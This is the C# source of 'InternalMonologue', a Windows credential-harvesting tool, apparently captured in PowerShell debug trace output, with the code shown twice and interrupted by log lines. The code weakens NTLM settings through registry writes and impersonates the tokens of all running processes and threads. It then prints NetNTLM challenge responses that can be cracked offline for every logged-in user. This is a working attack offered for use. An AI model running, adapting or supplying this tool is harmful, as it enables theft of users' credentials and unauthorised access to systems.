WindowsIdentity.GetCurrent().Name); }
                                }
                            }
                            catch
                            { /*Does not need to do anything if it fails*/ }
                            finally
                            {
                                CloseHandle(dupToken);
                            }
                        }
                    }
                }
            }
            catch (Exception)
            { /*Does not need to do anything if it fails*/ }
        }

        public static void HandleThread(ProcessThread thread, string challenge, bool verbose)
        {
            try
            {
                var token = IntPtr.Zero;
                var dupToken = IntPtr.Zero;
                string SID = null;

                //Try to get thread handle
                var handle = OpenThread(0x0040, true, new IntPtr(thread.Id));

                //If failed, return
                if (handle == IntPtr.Zero)
                {
                    return;
                }

                if (OpenThreadToken(handle, 0x0008, true, ref token))
                {
                    //Get the SID of the token
                    SID = GetLogonId(token);
                    CloseHandle(token);

                    //Check if this user hasn't been handled yet
                    if (SID != null && authenticatedUsers.Contains(SID) == false)
                    {
                        if (OpenThreadToken(handle, 0x0002, true, ref token))
                        {
                            var sa = new SECURITY_ATTRIBUTES();
                            sa.nLength = Marshal.SizeOf(sa);

                            DuplicateTokenEx(
                                token,
                                0x0002 | 0x0008,
                                ref sa,
                                (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                                (int)1,
                                ref dupToken);

                            CloseHandle(token);

                            try
                            {
                                using (WindowsImpersonationContext impersonatedUser = 
WindowsIdentity.Impersonate(dupToken))
                                {
                                    if (verbose == true) Console.WriteLine("Impersonated user " + 
WindowsIdentity.GetCurrent().Name);
                                    string result = InternalMonologueForCurrentUser(challenge);
                                    //Ensure it is a valid response and not blank
                                    if (result != null && result.Length > 0)
                                    {
                                        Console.WriteLine(result);
                                        authenticatedUsers.Add(SID);
                                    }
                                    else if (verbose == true) { Console.WriteLine("Got blank response for user " + 
WindowsIdentity.GetCurrent().Name); }
                                }
                            }
                            catch 
                            { /*Does not need to do anything if it fails*/ }
                            finally
                            {
                                CloseHandle(dupToken);
                            }
                        }
                    }
                }
            }
            catch (Exception)
            { /*Does not need to do anything if it fails*/ }
        }

        //Maintains a list of handled users
        static List<string> authenticatedUsers = new List<string>();

        //Parse command line arguments
        static Dictionary<string, string> ParseArgs(string[] args)
        {
            Dictionary<string, string> ret = new Dictionary<string, string>();
            if (args.Length % 2 == 0 && args.Length > 0)
            {
                for (int i = 0; i < args.Length; i = i + 2)
                {
                    ret.Add(args[i].Substring(1).ToLower(), args[i + 1].ToLower());
                }
            }
            return ret;
        }

        private static void PrintError(string message)
        {
            Console.WriteLine();
            Console.WriteLine("Error: " + message);
            PrintHelp();
        }

        private static void PrintHelp()
        {
            Console.WriteLine();
            Console.WriteLine("Usage:");
            Console.WriteLine("InternalMonologue -Downgrade True/False -Restore True/False - Impersonate True/False 
-Verbose True/False -Challenge ascii-hex");
            Console.WriteLine("Example:");
            Console.WriteLine("InternalMonologue -Downgrade False -Restore False -Impersonate True -Verbose False 
-Challenge 1122334455667788");
            Console.WriteLine();
            Console.WriteLine("Downgrade - Specifies whether to perform an NTLM downgrade or not [True/False]. 
Optional. Defult is true.");
            Console.WriteLine("Restore - Specifies whether to restore the original values from before the NTLM 
downgrade or not [True/False]. Optional. Defult is true.");
            Console.WriteLine("Impersonate - Specifies whether to try to impersonate all other available users or not 
[True/False]. Optional. Defult is true.");
            Console.WriteLine("Verbose - Specifies whether print verbose output or not [True/False]. Optional. Defult 
is false.");
            Console.WriteLine("Challenge - Specifies the NTLM challenge to be used. An 8-byte long value in ascii-hex 
representation. Optional. Defult is 1122334455667788.");
            Console.WriteLine();
        }

        public static void Main(string[] args)
        {
            Dictionary<string, string> argDict = ParseArgs(args);
            //Set defaults
            bool impersonate = true, downgrade = true, restore = true, verbose = false;
            string challenge = "1122334455667788";

            if (args.Length > 0 && argDict.Count == 0)
            {
                PrintHelp();
                return;
            }
            else if (args.Length == 0)
            {
                Console.Error.WriteLine("Running with default settings. Type -Help for more information.\n");

            }

            if (argDict.ContainsKey("impersonate"))
            {
                if (bool.TryParse(argDict["impersonate"], out impersonate) == false)
                {
                    PrintError("Impersonate must be a boolean value (True/False)");
                    return;
                }
            }
            if (argDict.ContainsKey("downgrade"))
            {
                if (bool.TryParse(argDict["downgrade"], out downgrade) == false)
                {
                    PrintError("Downgrade must be a boolean value (True/False)");
                    return;
                }
            }
            if (argDict.ContainsKey("restore"))
            {
                if (bool.TryParse(argDict["restore"], out restore) == false)
                {
                    PrintError("Restore must be a boolean value (True/False)");
                    return;
                }
            }
            if (argDict.ContainsKey("verbose"))
            {
                if (bool.TryParse(argDict["verbose"], out verbose) == false)
                {
                    PrintError("Verbose must be a boolean value (True/False)");
                    return;
                }
            }
            if (argDict.ContainsKey("challenge"))
            {
                challenge = argDict["challenge"].ToUpper();
                if (Regex.IsMatch(challenge, @"^[0-9A-F]{16}$") == false)
                {
                    PrintError("Challenge must be a 8-byte long value in asciihex representation.  (e.g. 
1122334455667788)");
                    return;
                }
            }


            //Extended NetNTLM Downgrade and impersonation can only work if the current process is elevated
            if (IsElevated())
            {
                if (verbose == true) Console.WriteLine("Running elevated");
                object oldValue_LMCompatibilityLevel = null;
                object oldValue_NtlmMinClientSec = null;
                object oldValue_RestrictSendingNTLMTraffic = null;
                if (downgrade == true)
                {
                    if (verbose == true) Console.WriteLine("Performing NTLM Downgrade");
                    //Perform an Extended NetNTLM Downgrade and store the current values to restore them later
                    ExtendedNTLMDowngrade(out oldValue_LMCompatibilityLevel, out oldValue_NtlmMinClientSec, out 
oldValue_RestrictSendingNTLMTraffic);
                }

                if (impersonate == true)
                {
                    if (verbose == true) Console.WriteLine("Starting impersonation");
                    foreach (Process process in Process.GetProcesses())
                    {
                        if (process.ProcessName.Contains("lsass") == false) // Do not touch LSASS
                        {
                            HandleProcess(process, challenge, verbose);
                            foreach (ProcessThread thread in process.Threads)
                            {
                                HandleThread(thread, challenge, verbose);
                            }
                        }
                    }
                }
                else
                {
                    if (verbose == true) Console.WriteLine("Performing attack on current user only (no 
impersonation)");
                    Console.WriteLine(InternalMonologueForCurrentUser(challenge));
                }

                if (downgrade == true && restore == true)
                {
                    if (verbose == true) Console.WriteLine("Restoring NTLM values");
                    //Undo changes made in the Extended NetNTLM Downgrade
                    NTLMRestore(oldValue_LMCompatibilityLevel, oldValue_NtlmMinClientSec, 
oldValue_RestrictSendingNTLMTraffic);
                }
            }
            else
            {
                //If the process is not elevated, skip downgrade and impersonation and only perform an Internal 
Monologue Attack for the current user
                if (verbose == true) Console.WriteLine("Not elevated. Performing attack with current NTLM settings on 
current user");
                Console.WriteLine(InternalMonologueForCurrentUser(challenge));
            }           
        }

        //This function performs an Internal Monologue Attack in the context of the current user and returns the 
NetNTLM response for the challenge 0x1122334455667788
        private static string InternalMonologueForCurrentUser(string challenge)
        {
            SecBufferDesc ClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);

            SECURITY_HANDLE _hOutboundCred;
                _hOutboundCred.LowPart = _hOutboundCred.HighPart = IntPtr.Zero;
            SECURITY_INTEGER ClientLifeTime;
                ClientLifeTime.LowPart = 0;
                ClientLifeTime.HighPart = 0;
            SECURITY_HANDLE _hClientContext;
            uint ContextAttributes = 0;

            // Acquire credentials handle for current user
            AcquireCredentialsHandle(
                WindowsIdentity.GetCurrent().Name,
                "NTLM",
                2,
                IntPtr.Zero,
                IntPtr.Zero,
                0,
                IntPtr.Zero,
                ref _hOutboundCred,
                ref ClientLifeTime
                );

            // Get a type-1 message from NTLM SSP
            InitializeSecurityContext(
                ref _hOutboundCred,
                IntPtr.Zero,
                WindowsIdentity.GetCurrent().Name,
                0x00000800,
                0,
                0x10,
                IntPtr.Zero,
                0,
                out _hClientContext,
                out ClientToken,
                out ContextAttributes,
                out ClientLifeTime
                );
            ClientToken.Dispose();

            ClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);

            // Custom made type-2 message with the specified challenge
            byte[] challengeBytes = StringToByteArray(challenge);
            SecBufferDesc ServerToken = new SecBufferDesc(new byte[] { 78, 84, 76, 77, 83, 83, 80, 0, 2, 0, 0, 0, 0, 0,
 0, 0, 40, 0, 0, 0, 1, 0x82, 0, 0, challengeBytes[0], challengeBytes[1], challengeBytes[2], challengeBytes[3], 
challengeBytes[4], challengeBytes[5], challengeBytes[6], challengeBytes[7], 0, 0, 0, 0, 0, 0, 0 });
            InitializeSecurityContext(
                ref _hOutboundCred,
                ref _hClientContext,
                WindowsIdentity.GetCurrent().Name,
                0x00000800,
                0,
                0x10,
                ref ServerToken,
                0,
                out _hClientContext,
                out ClientToken,
                out ContextAttributes,
                out ClientLifeTime
                );
            byte[] result = ClientToken.GetSecBufferByteArray();

            ClientToken.Dispose();
            ServerToken.Dispose();

            //Extract the NetNTLM response from a type-3 message and return it
            return ParseNTResponse(result, challenge);
        }

        //This function parses the NetNTLM response from a type-3 message
        private static string ParseNTResponse(byte[] message, string challenge)
        {
            ushort lm_resp_len = BitConverter.ToUInt16(message, 12);
            uint lm_resp_off = BitConverter.ToUInt32(message, 16);
            ushort nt_resp_len = BitConverter.ToUInt16(message, 20);
            uint nt_resp_off = BitConverter.ToUInt32(message, 24);
            ushort domain_len = BitConverter.ToUInt16(message, 28);
            uint domain_off = BitConverter.ToUInt32(message, 32);
            ushort user_len = BitConverter.ToUInt16(message, 36);
            uint user_off = BitConverter.ToUInt32(message, 40);
            byte[] lm_resp = new byte[lm_resp_len];
            byte[] nt_resp = new byte[nt_resp_len];
            byte[] domain = new byte[domain_len];
            byte[] user = new byte[user_len];
            Array.Copy(message, lm_resp_off, lm_resp, 0, lm_resp_len);
            Array.Copy(message, nt_resp_off, nt_resp, 0, nt_resp_len);
            Array.Copy(message, domain_off, domain, 0, domain_len);
            Array.Copy(message, user_off, user, 0, user_len);

            string result = null;
            if (nt_resp_len == 24)
            {
                result = ConvertHex(ByteArrayToString(user)) + "::" + ConvertHex(ByteArrayToString(domain)) + ":" + 
ByteArrayToString(lm_resp) + ":" + ByteArrayToString(nt_resp) + ":" + challenge;
            }
            else if (nt_resp_len > 24)
            {
                result = ConvertHex(ByteArrayToString(user)) + "::" + ConvertHex(ByteArrayToString(domain)) + ":" + 
challenge + ":" + ByteArrayToString(nt_resp).Substring(0,32) + ":" + ByteArrayToString(nt_resp).Substring(32);
            }
            
            return result;
        }

        //The following function is taken from 
https://stackoverflow.com/questions/311165/how-do-you-convert-a-byte-array-to-a-hexadecimal-string-and-vice-versa
        private static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }

        //This function is taken from 
https://stackoverflow.com/questions/3600322/check-if-the-current-user-is-administrator
        private static bool IsElevated()
        {
            return (new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator);
        }

        //This function is taken from 
https://stackoverflow.com/questions/321370/how-can-i-convert-a-hex-string-to-a-byte-array
        public static byte[] StringToByteArray(string hex)
        {
            if (hex.Length % 2 == 1)
                return null;

            byte[] arr = new byte[hex.Length >> 1];

            for (int i = 0; i < hex.Length >> 1; ++i)
            {
                arr[i] = (byte)((GetHexVal(hex[i << 1]) << 4) + (GetHexVal(hex[(i << 1) + 1])));
            }

            return arr;
        }

        //This function is taken from 
https://stackoverflow.com/questions/321370/how-can-i-convert-a-hex-string-to-a-byte-array
        public static int GetHexVal(char hex)
        {
            int val = (int)hex;
            return val - (val < 58 ? 48 : 55);
        }

        //This function is taken from https://stackoverflow.com/questions/5613279/c-sharp-hex-to-ascii
        public static string ConvertHex(String hexString)
        {
            string ascii = string.Empty;

            for (int i = 0; i < hexString.Length; i += 2)
            {
                String hs = string.Empty;

                hs = hexString.Substring(i, 2);
                if (hs == "00")
                    continue;
                uint decval = System.Convert.ToUInt32(hs, 16);
                char character = System.Convert.ToChar(decval);
                ascii += character;

            }

            return ascii;         
        }
    }

    struct SecBuffer : IDisposable
    {
        public int cbBuffer;
        public int BufferType;
        public IntPtr pvBuffer;

        public SecBuffer(int bufferSize)
        {
            cbBuffer = bufferSize;
            BufferType = 2;
            pvBuffer = Marshal.AllocHGlobal(bufferSize);
        }

        public SecBuffer(byte[] secBufferBytes)
        {
            cbBuffer = secBufferBytes.Length;
            BufferType = 2;
            pvBuffer = Marshal.AllocHGlobal(cbBuffer);
            Marshal.Copy(secBufferBytes, 0, pvBuffer, cbBuffer);
        }

        public SecBuffer(byte[] secBufferBytes, int bufferType)
        {
            cbBuffer = secBufferBytes.Length;
            BufferType = (int)bufferType;
            pvBuffer = Marshal.AllocHGlobal(cbBuffer);
            Marshal.Copy(secBufferBytes, 0, pvBuffer, cbBuffer);
        }

        public void Dispose()
        {
            if (pvBuffer != IntPtr.Zero)
            {
                Marshal.FreeHGlobal(pvBuffer);
                pvBuffer = IntPtr.Zero;
            }
        }
    }

    struct SecBufferDesc : IDisposable
    {
        public int ulVersion;
        public int cBuffers;
        public IntPtr pBuffers;

        public SecBufferDesc(int bufferSize)
        {
            ulVersion = 0;
            cBuffers = 1;
            SecBuffer ThisSecBuffer = new SecBuffer(bufferSize);
            pBuffers = Marshal.AllocHGlobal(Marshal.SizeOf(ThisSecBuffer));
            Marshal.StructureToPtr(ThisSecBuffer, pBuffers, false);
        }

        public SecBufferDesc(byte[] secBufferBytes)
        {
            ulVersion = 0;
            cBuffers = 1;
            SecBuffer ThisSecBuffer = new SecBuffer(secBufferBytes);
            pBuffers = Marshal.AllocHGlobal(Marshal.SizeOf(ThisSecBuffer));
            Marshal.StructureToPtr(ThisSecBuffer, pBuffers, false);
        }

        public void Dispose()
        {
            if (pBuffers != IntPtr.Zero)
            {
                if (cBuffers == 1)
                {
                    SecBuffer ThisSecBuffer = (SecBuffer)Marshal.PtrToStructure(pBuffers, typeof(SecBuffer));
                    ThisSecBuffer.Dispose();
                }
                else
                {
                    for (int Index = 0; Index < cBuffers; Index++)
                    {
                        int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
                        IntPtr SecBufferpvBuffer = Marshal.ReadIntPtr(pBuffers, CurrentOffset + 
Marshal.SizeOf(typeof(int)) + Marshal.SizeOf(typeof(int)));
                        Marshal.FreeHGlobal(SecBufferpvBuffer);
                    }
                }

                Marshal.FreeHGlobal(pBuffers);
                pBuffers = IntPtr.Zero;
            }
        }

        public byte[] GetSecBufferByteArray()
        {
            byte[] Buffer = null;

            if (pBuffers == IntPtr.Zero)
            {
                throw new InvalidOperationException("Object has already been disposed!!!");
            }

            if (cBuffers == 1)
            {
                SecBuffer ThisSecBuffer = (SecBuffer)Marshal.PtrToStructure(pBuffers, typeof(SecBuffer));

                if (ThisSecBuffer.cbBuffer > 0)
                {
                    Buffer = new byte[ThisSecBuffer.cbBuffer];
                    Marshal.Copy(ThisSecBuffer.pvBuffer, Buffer, 0, ThisSecBuffer.cbBuffer);
                }
            }
            else
            {
                int BytesToAllocate = 0;

                for (int Index = 0; Index < cBuffers; Index++)
                {
                    //calculate the total number of bytes we need to copy...
                    int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
                    BytesToAllocate += Marshal.ReadInt32(pBuffers, CurrentOffset);
                }

                Buffer = new byte[BytesToAllocate];

                for (int Index = 0, BufferIndex = 0; Index < cBuffers; Index++)
                {
                    //Now iterate over the individual buffers and put them together into a byte array...
                    int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
                    int BytesToCopy = Marshal.ReadInt32(pBuffers, CurrentOffset);
                    IntPtr SecBufferpvBuffer = Marshal.ReadIntPtr(pBuffers, CurrentOffset + Marshal.SizeOf(typeof(int))
 + Marshal.SizeOf(typeof(int)));
                    Marshal.Copy(SecBufferpvBuffer, Buffer, BufferIndex, BytesToCopy);
                    BufferIndex += BytesToCopy;
                }
            }

            return (Buffer);
        }
    }

    struct SECURITY_INTEGER
    {
        public uint LowPart;
        public int HighPart;
    };

    struct SECURITY_HANDLE
    {
        public IntPtr LowPart;
        public IntPtr HighPart;

    };

    struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }

    enum SECURITY_IMPERSONATION_LEVEL
    {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation
    }
}
] to parameter [TypeDefinition]
DEBUG: ParameterBinding Information: 0 :         COERCE arg to [System.String]
DEBUG: ParameterBinding Information: 0 :             Parameter and arg types the same, no coercion is needed.
DEBUG: ParameterBinding Information: 0 :         Executing VALIDATION metadata: 
[System.Management.Automation.ValidateTrustedDataAttribute]
DEBUG: ParameterBinding Information: 0 :         BIND arg [using System;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text.RegularExpressions;

namespace InternalMonologue
{
    public class Program
    {
        const int MAX_TOKEN_SIZE = 12288;

        struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_GROUPS
        {
            public int GroupCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public SID_AND_ATTRIBUTES[] Groups;
        };

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);

        [DllImport("kernel32.dll")]
        static extern IntPtr LocalFree(IntPtr hMem);

        [DllImport("secur32.dll", CharSet = CharSet.Auto)]
        static extern int AcquireCredentialsHandle(
            string pszPrincipal,
            string pszPackage,
            int fCredentialUse,
            IntPtr PAuthenticationID,
            IntPtr pAuthData,
            int pGetKeyFn,
            IntPtr pvGetKeyArgument,
            ref SECURITY_HANDLE phCredential,
            ref SECURITY_INTEGER ptsExpiry);

        [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int InitializeSecurityContext(
            ref SECURITY_HANDLE phCredential,
            IntPtr phContext,
            string pszTargetName,
            int fContextReq,
            int Reserved1,
            int TargetDataRep,
            IntPtr pInput,
            int Reserved2,
            out SECURITY_HANDLE phNewContext,
            out SecBufferDesc pOutput,
            out uint pfContextAttr,
            out SECURITY_INTEGER ptsExpiry);

        [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int InitializeSecurityContext(
            ref SECURITY_HANDLE phCredential,
            ref SECURITY_HANDLE phContext,  
            string pszTargetName,
            int fContextReq,
            int Reserved1,
            int TargetDataRep,
            ref SecBufferDesc SecBufferDesc,
            int Reserved2,
            out SECURITY_HANDLE phNewContext,
            out SecBufferDesc pOutput,
            out uint pfContextAttr,
            out SECURITY_INTEGER ptsExpiry);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            int DesiredAccess,
            ref IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenThreadToken(
            IntPtr ThreadHandle,
            int DesiredAccess,
            bool OpenAsSelf,
            ref IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(
            IntPtr TokenHandle,
            int TokenInformationClass,
            IntPtr TokenInformation,
            int TokenInformationLength,
            out int ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool DuplicateTokenEx(
            IntPtr hExistingToken,
            int dwDesiredAccess,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            int ImpersonationLevel,
            int dwTokenType,
            ref IntPtr phNewToken);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(
            IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle,
            IntPtr dwThreadId);

        private static void GetRegKey(string key, string name, out object result)
        {
            RegistryKey Lsa = Registry.LocalMachine.OpenSubKey(key);
            if (Lsa != null)
            {
                object value = Lsa.GetValue(name);
                if (value != null)
                {
                    result = value;
                    return;
                }
            }
            result = null;
        }

        private static void SetRegKey(string key, string name, object value)
        {
            RegistryKey Lsa = Registry.LocalMachine.OpenSubKey(key, true);
            if (Lsa != null)
            {
                if (value == null)
                {
                    Lsa.DeleteValue(name);
                }
                else
                {
                    Lsa.SetValue(name, value);
                }
            }
        }

        private static void ExtendedNTLMDowngrade(out object oldValue_LMCompatibilityLevel, out object 
oldValue_NtlmMinClientSec, out object oldValue_RestrictSendingNTLMTraffic)
        {
            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", out 
oldValue_LMCompatibilityLevel);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", 2);

            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", out 
oldValue_NtlmMinClientSec);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", 536870912);

            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", out 
oldValue_RestrictSendingNTLMTraffic);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", 0);
        }

        private static void NTLMRestore(object oldValue_LMCompatibilityLevel, object oldValue_NtlmMinClientSec, object 
oldValue_RestrictSendingNTLMTraffic)
        {
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", 
oldValue_LMCompatibilityLevel);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", 
oldValue_NtlmMinClientSec);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", 
oldValue_RestrictSendingNTLMTraffic);
        }

        //Retrieves the SID of a given token
        public static string GetLogonId(IntPtr token)
        {
            string SID = null;
            try
            {
                StringBuilder sb = new StringBuilder();
                int TokenInfLength = 1024;
                IntPtr TokenInformation = Marshal.AllocHGlobal(TokenInfLength);
                Boolean Result = GetTokenInformation(token, 1, TokenInformation, TokenInfLength, out TokenInfLength);
                if (Result)
                {
                    TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));

                    IntPtr pstr = IntPtr.Zero;
                    Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
                    SID = Marshal.PtrToStringAuto(pstr);
                    LocalFree(pstr);
                }

                Marshal.FreeHGlobal(TokenInformation);

                return SID;
            }
            catch 
            {
                CloseHandle(token);
                return null;
            }
        }

        public static void HandleProcess(Process process, string challenge, bool verbose)
        {
            try
            {
                var token = IntPtr.Zero;
                var dupToken = IntPtr.Zero;
                string SID = null;

                if (OpenProcessToken(process.Handle, 0x0008, ref token))
                {
                    //Get the SID of the token
                    SID = GetLogonId(token);
                    CloseHandle(token);

                    //Check if this user hasn't been handled yet
                    if (SID != null && authenticatedUsers.Contains(SID) == false)
                    {
                        if (OpenProcessToken(process.Handle, 0x0002, ref token))
                        {
                            var sa = new SECURITY_ATTRIBUTES();
                            sa.nLength = Marshal.SizeOf(sa);

                            DuplicateTokenEx(
                                token,
                                0x0002 | 0x0008,
                                ref sa,
                                (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                                (int)1,
                                ref dupToken);

                            CloseHandle(token);

                            try
                            {
                                using (WindowsImpersonationContext impersonatedUser = 
WindowsIdentity.Impersonate(dupToken))
                                {
                                    if (verbose == true) Console.WriteLine("Impersonated user " + 
WindowsIdentity.GetCurrent().Name);
                                    string result = InternalMonologueForCurrentUser(challenge);
                                    //Ensure it is a valid response and not blank
                                    if (result != null && result.Length > 0)
                                    {
                                        Console.WriteLine(result);
                                        authenticatedUsers.Add(SID);
                                    }
                                    else if (verbose == true) { Console.WriteLine("Got blank response for user " + 
WindowsIdentity.GetCurrent().Name); }
                                }
                            }
                            catch
                            { /*Does not need to do anything if it fails*/ }
                            finally
                            {
                                CloseHandle(dupToken);
                            }
                        }
                    }
                }
            }
            catch (Exception)
            { /*Does not need to do anything if it fails*/ }
        }

        public static void HandleThread(ProcessThread thread, string challenge, bool verbose)
        {
            try
            {
                var token = IntPtr.Zero;
                var dupToken = IntPtr.Zero;
                string SID = null;

                //Try to get thread handle
                var handle = OpenThread(0x0040, true, new IntPtr(thread.Id));

                //If failed, return
                if (handle == IntPtr.Zero)
                {
                    return;
                }

                if (OpenThreadToken(handle, 0x0008, true, ref token))
                {
                    //Get the SID of the token
                    SID = GetLogonId(token);
                    CloseHandle(token);

                    //Check if this user hasn't been handled yet
                    if (SID != null && authenticatedUsers.Contains(SID) == false)
                    {
                        if (OpenThreadToken(handle, 0x0002, true, ref token))
                        {
                            var sa = new SECURITY_ATTRIBUTES();
                            sa.nLength = Marshal.SizeOf(sa);

                            DuplicateTokenEx(
                                token,
                                0x0002 | 0x0008,
                                ref sa,
                                (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                                (int)1,
                                ref dupToken);

                            CloseHandle(token);

                            try
                            {
                                using (WindowsImpersonationContext impersonatedUser = 
WindowsIdentity.Impersonate(dupToken))
                                {
                                    if (verbose == true) Console.WriteLine("Impersonated user " + 
WindowsIdentity.GetCurrent().Name);
                                    string result = InternalMonologueForCurrentUser(challenge);
                                    //Ensure it is a valid response and not blank
                                    if (result != null && result.Length > 0)
                                    {
                                        Console.WriteLine(result);
                                        authenticatedUsers.Add(SID);
                                    }
                                    else if (verbose == true) { Console.WriteLine("Got blank response for user " + 
WindowsIdentity.GetCurrent().Name); }
                                }
                            }
                            catch 
                            { /*Does not need to do anything if it fails*/ }
                            finally
                            {
                                CloseHandle(dupToken);
                            }
                        }
                    }
                }
            }
            catch (Exception)
            { /*Does not need to do anything if it fails*/ }
        }

        //Maintains a list of handled users
        static List<string> authenticatedUsers = new List<string>();

        //Parse command line arguments
        static Dictionary<string, string> ParseArgs(string[] args)
        {
            Dictionary<string, string> ret = new Dictionary<string, string>();
            if (args.Length % 2 == 0 && args.Length > 0)
            {
                for (int i = 0; i < args.Length; i = i + 2)
                {
                    ret.Add(args[i].Substring(1).ToLower(), args[i + 1].ToLower());
                }
            }
            return ret;
        }

        private static void PrintError(string message)
        {
            Console.WriteLine();
            Console.WriteLine("Error: " + message);
            PrintHelp();
        }

        private static void PrintHelp()
        {
            Console.WriteLine();
            Console.WriteLine("Usage:");
            Console.WriteLine("InternalMonologue -Downgrade True/False -Restore True/False - Impersonate True/False 
-Verbose True/False -Challenge ascii-hex");
            Console.WriteLine("Example:");
            Console.WriteLine("InternalMonologue -Downgrade False -Restore False -Impersonate True -Verbose False 
-Challenge 1122334455667788");
            Console.WriteLine();
            Console.WriteLine("Downgrade - Specifies whether to perform an NTLM downgrade or not [True/False]. 
Optional. Defult is true.");
            Console.WriteLine("Restore - Specifies whether to restore the original values from before the NTLM 
downgrade or not [True/False]. Optional. Defult is true.");
            Console.WriteLine("Impersonate - Specifies whether to try to impersonate all other available users or not 
[True/False]. Optional. Defult is true.");
            Console.WriteLine("Verbose - Specifies whether print verbose output or not [True/False]. Optional. Defult 
is false.");
            Console.WriteLine("Challenge - Specifies the NTLM challenge to be used. An 8-byte long value in ascii-hex 
representation. Optional. Defult is 1122334455667788.");
            Console.WriteLine();
        }

        public static void Main(string[] args)
        {
            Dictionary<string, string> argDict = ParseArgs(args);
            //Set defaults
            bool impersonate = true, downgrade = true, restore = true, verbose = false;
            string challenge = "1122334455667788";

            if (args.Length > 0 && argDict.Count == 0)
            {
                PrintHelp();
                return;
            }
            else if (args.Length == 0)
            {
                Console.Error.WriteLine("Running with default settings. Type -Help for more information.\n");

            }

            if (argDict.ContainsKey("impersonate"))
            {
                if (bool.TryParse(argDict["impersonate"], out impersonate) == false)
                {
                    PrintError("Impersonate must be a boolean value (True/False)");
                    return;
                }
            }
            if (argDict.ContainsKey("downgrade"))
            {
                if (bool.TryParse(argDict["downgrade"], out downgrade) == false)
                {
                    PrintError("Downgrade must be a boolean value (True/False)");
                    return;
                }
            }
            if (argDict.ContainsKey("restore"))
            {
                if (bool.TryParse(argDict["restore"], out restore) == false)
                {
                    PrintError("Restore must be a boolean value (True/False)");
                    return;
                }
            }
            if (argDict.ContainsKey("verbose"))
            {
                if (bool.TryParse(argDict["verbose"], out verbose) == false)
                {
                    PrintError("Verbose must be a boolean value (True/False)");
                    return;
                }
            }
            if (argDict.ContainsKey("challenge"))
            {
                challenge = argDict["challenge"].ToUpper();
                if (Regex.IsMatch(challenge, @"^[0-9A-F]{16}$") == false)
                {
                    PrintError("Challenge must be a 8-byte long value in asciihex representation.  (e.g. 
1122334455667788)");
                    return;
                }
            }


            //Extended NetNTLM Downgrade and impersonation can only work if the current process is elevated
            if (IsElevated())
            {
                if (verbose == true) Console.WriteLine("Running elevated");
                object oldValue_LMCompatibilityLevel = null;
                object oldValue_NtlmMinClientSec = null;
                object oldValue_RestrictSendingNTLMTraffic = null;
                if (downgrade == true)
                {
                    if (verbose == true) Console.WriteLine("Performing NTLM Downgrade");
                    //Perform an Extended NetNTLM Downgrade and store the current values to restore them later
                    ExtendedNTLMDowngrade(out oldValue_LMCompatibilityLevel, out oldValue_NtlmMinClientSec, out 
oldValue_RestrictSendingNTLMTraffic);
                }

                if (impersonate == true)
                {
                    if (verbose == true) Console.WriteLine("Starting impersonation");
                    foreach (Process process in Process.GetProcesses())
                    {
                        if (process.ProcessName.Contains("lsass") == false) // Do not touch LSASS
                        {
                            HandleProcess(process, challenge, verbose);
                            foreach (ProcessThread thread in process.Threads)
                            {
                                HandleThread(thread, challenge, verbose);
                            }
                        }
                    }
                }
                else
                {
